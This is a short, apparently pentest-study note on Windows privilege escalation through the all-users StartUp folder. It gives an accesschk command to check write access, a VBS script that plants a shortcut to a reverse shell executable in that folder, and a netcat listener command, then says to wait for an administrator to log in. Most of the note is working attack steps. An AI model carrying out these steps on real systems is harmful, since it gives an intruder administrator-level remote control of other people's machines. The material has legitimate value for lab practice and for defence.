- - -
Each User can define apps that start when they log in, by placing shortcuts to them in a specific directory.
- - -

Windows also has a **STARTUP** Directory for apps that should start for all users:

```powershell
C:\ProgramData\MicroSoft\Windows\Start Menu\Programs\StartUp
```

If we create files in this directory, we can use our reverse shell executable and escalate privileges when an admin logs in.

- - -
## Veryfying :

Do we have write permissions in the existing binary path. Note at your GROUP in the results.

```powershell
.\accesschk.exe /accepteula -d "C:\ProgramData\MicroSoft\Windows\Start Menu\Programs\StartUp"
```
 
Create A File “**CreateShortcut.vbs**” with the following contents.

```powershell
set oWS = WScript.CreateObject("WScript.Shell")  
sLinkFile = "C:\ProgramData\MicroSoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"  
Set oLink = oWS.CreateShortcut(sLinkFile)  
oLink.TargetPath = "C:\Path\To\reverse.exe"  
oLink.Save
```

```cmd
cscript CreateShortcut.vbs
```

```sh
nc -nvlp 9090
``` 

Now wait for Admin to Login......
- - -


